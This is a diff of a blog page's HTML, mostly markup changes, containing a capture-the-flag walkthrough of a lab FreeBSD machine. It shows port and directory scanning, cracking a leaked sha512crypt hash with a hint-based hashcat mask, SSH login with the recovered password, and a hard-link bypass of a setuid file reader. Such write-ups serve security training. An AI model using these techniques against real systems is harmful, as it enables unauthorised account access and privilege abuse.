@@ -134,7 +134,7 @@
 </ul>
 <h1 id="information-gathering">information gathering</h1>
 <p>A nmap scan of the machine reveals a FreeBSD server with a webserver present.</p>
-<pre><code>root@kali:~# nmap -sS -p- -A 192.168.56.2
+<pre tabindex="0"><code>root@kali:~# nmap -sS -p- -A 192.168.56.2
 Nmap scan report for 192.168.56.2
 Host is up (0.00064s latency).
 Not shown: 65532 filtered ports
@@ -156,7 +156,7 @@ PORT    STATE SERVICE  VERSION
 |_Not valid after:  2017-11-05T05:05:36
 |_ssl-date: TLS randomness does not represent time
 </code></pre><p>The webserver contains the following rules</p>
-<pre><code>Engagement Rules:
+<pre tabindex="0"><code>Engagement Rules:
 
 No SSH bruteforcing is necessary
 This box has 3 flags
@@ -165,7 +165,7 @@ The goal is not to get root. Get the flags and move on
 Have fun
 </code></pre><h1 id="flag1">flag1</h1>
 <p>We start by running <code>dirb</code> against the target to identify scripts and directories to attack. As we know from the <code>nmap</code> output the server is also running PHP so let&rsquo;s scan for files with a <code>.php</code> ending too.</p>
-<pre><code>root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt
+<pre tabindex="0"><code>root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt
 -----------------
 DIRB v2.22
 By The Dark Raver
@@ -179,7 +179,7 @@ GENERATED WORDS: 20458
 -----------------
 END_TIME: Fri Jan 13 21:24:24 2017
 DOWNLOADED: 20458 - FOUND: 0
-</code></pre><pre><code>root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt -X .php
+</code></pre><pre tabindex="0"><code>root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt -X .php
 -----------------
 DIRB v2.22
 By The Dark Raver
@@ -241,7 +241,7 @@ DOWNLOADED: 20458 - FOUND: 1
 </span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
 </span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
 </span></code></pre></div><p>Next we examine the other files present</p>
-<pre><code>total 144
+<pre tabindex="0"><code>total 144
 drwxr-xr-x  4 root  wheel   512B Nov  9 20:24 .
 drwxr-xr-x  6 root  wheel   512B Nov  9 19:58 ..
 -rw-r--r--  1 root  wheel   561B Nov  8 23:51 index.html
@@ -251,20 +251,20 @@ drwxr-xr-x  2 root  wheel   512B Nov  9 20:22 s1kr3t
 -rw-r--r--  1 root  wheel   759B Nov  5 00:50 scanner.php
 -rw-r--r--  1 root  wheel   612B Nov  4 01:01 styles.css
 </code></pre><p>The first flag can be found in the <code>s1kr3t</code> directory.</p>
-<pre><code>cat s1kr3t/flag.txt
+<pre tabindex="0"><code>cat s1kr3t/flag.txt
 FLAG{n0_one_br3aches_teh_f0rt}
 </code></pre><h1 id="flag2">flag2</h1>
 <p>There is also another interesting directory named <code>k1ngd0m_k3yz</code>. The directory seems to contain a line extracted from <code>/etc/shadow</code> and the corresponding line from <code>/etc/passwd</code>.</p>
-<pre><code>cat k1ngd0m_k3yz/master
+<pre tabindex="0"><code>cat k1ngd0m_k3yz/master
 craven:$6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.:1002:1002::0:0:User &amp;:/home/craven:/bin/sh
 
 cat k1ngd0m_k3yz/passwd
 craven:*:1002:1002:User &amp;:/home/craven:/bin/sh
 </code></pre><p>So we now have a hash for the user <code>craven</code>. If we look at raven&rsquo;s home directory under <code>/home/craven</code> we can see an unreadable <code>flag.txt</code>, <code>hint.txt</code> and <code>reminder.txt</code>.</p>
 <p>The hint says:</p>
-<pre><code>Keep forgetting my password, so I made myself a hint. Password is three digits followed by my pet's name and a symbol.
+<pre tabindex="0"><code>Keep forgetting my password, so I made myself a hint. Password is three digits followed by my pet's name and a symbol.
 </code></pre><p>And the reminder:</p>
-<pre><code>To buy:
+<pre tabindex="0"><code>To buy:
 * skim milk
 * organic free-run eggs
 * dog bone for qwerty
@@ -272,10 +272,10 @@ craven:*:1002:1002:User &amp;:/home/craven:/bin/sh
 </code></pre><p>So it looks like <code>craven</code> owns a dog named <code>qwerty</code> and uses it as part of his password.</p>
 <p>The next step is to create a custom wordlist using the pattern from the hint. We use <a href="https://github.com/hashcat/maskprocessor">Hashcat Maskprocessor</a> for this purpose.</p>
 <p>After building the source code we can generate all possible passwords by running the following command:</p>
-<pre><code>./mp64.bin ?d?d?dqwerty?s &gt; pass.txt
+<pre tabindex="0"><code>./mp64.bin ?d?d?dqwerty?s &gt; pass.txt
 </code></pre><p><code>?d</code> stands for one digit and <code>?s</code> for a symbol. This command creates every possible word starting with 3 digits followed by the word qwery and a symbol.</p>
 <p>Now we can use this wordlist to crack the hash using <a href="https://hashcat.net/hashcat/">hashcat</a>. The hash type is <code>1800</code> which is defined as <code>sha512crypt $6$, SHA512(Unix)</code> (we can identify this by looking at the starting <code>$6$</code> of the hash). The file <code>hash.txt</code> only contains the hash without the extra stuff from the <code>master</code> file.</p>
-<pre><code>[firefart@linux hashcat]$ ./hashcat -m 1800 hash.txt pass.txt
+<pre tabindex="0"><code>[firefart@linux hashcat]$ ./hashcat -m 1800 hash.txt pass.txt
 hashcat (v3.30-5-gdd57ef5) starting...
 
 OpenCL Platform #1: NVIDIA Corporation
@@ -326,12 +326,12 @@ Started: Fri Jan 13 22:25:23 2017
 Stopped: Fri Jan 13 22:25:29 2017
 </code></pre><p>So we found cravens password: <code>931qwerty?</code>.</p>
 <p>Now we can try to login as <code>craven</code> via SSH to see if the password is valid and get the next flag.</p>
-<pre><code>ssh craven@192.168.56.2
+<pre tabindex="0"><code>ssh craven@192.168.56.2
 $ cat flag.txt
 FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
 </code></pre><h1 id="flag3">flag3</h1>
 <p>We can spot a suid binary from the user <code>vulnhub</code> in it&rsquo;s home directory <code>/home/vulnhub</code>.</p>
-<pre><code>$ cd /home/vulnhub/
+<pre tabindex="0"><code>$ cd /home/vulnhub/
 $ ./reader
 ./reader [file to read]
 $ ./reader flag.txt
@@ -345,12 +345,12 @@ Great! Printing file contents...
 Win, here's your flag:
 # $FreeBSD: releng/11.0/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
 </code></pre><p>It seems the binary checks the filename for <code>flag.txt</code> so let&rsquo;s try to trick this check with a symbolic link:</p>
-<pre><code>$ ln -s /home/vulnhub/flag.txt /tmp/test
+<pre tabindex="0"><code>$ ln -s /home/vulnhub/flag.txt /tmp/test
 $ ./reader /tmp/test
 Checking file type...
 Symbolic links not allowed!
 </code></pre><p>Bummer, no symbolic links allowed. So let&rsquo;s try to use a hard link:</p>
-<pre><code>$ ln -f /home/vulnhub/flag.txt /tmp/test
+<pre tabindex="0"><code>$ ln -f /home/vulnhub/flag.txt /tmp/test
 $ ./reader /tmp/test
 Checking file type...
 Checking if flag file...
@@ -359,7 +359,7 @@ Win, here's your flag:
 FLAG{its_A_ph0t0_ph1ni5h}
 </code></pre><p>Done!</p>
 <h1 id="flags">flags</h1>
-<pre><code>FLAG{n0_one_br3aches_teh_f0rt}
+<pre tabindex="0"><code>FLAG{n0_one_br3aches_teh_f0rt}
 FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
 FLAG{its_A_ph0t0_ph1ni5h}
 </code></pre>
@@ -370,7 +370,7 @@ FLAG{its_A_ph0t0_ph1ni5h}
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
             <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+            <li>source code available on <a href="https://github.com/FireFart/firefart.github.io">Github</a></li>
         </ul>
     </div>
 </div>
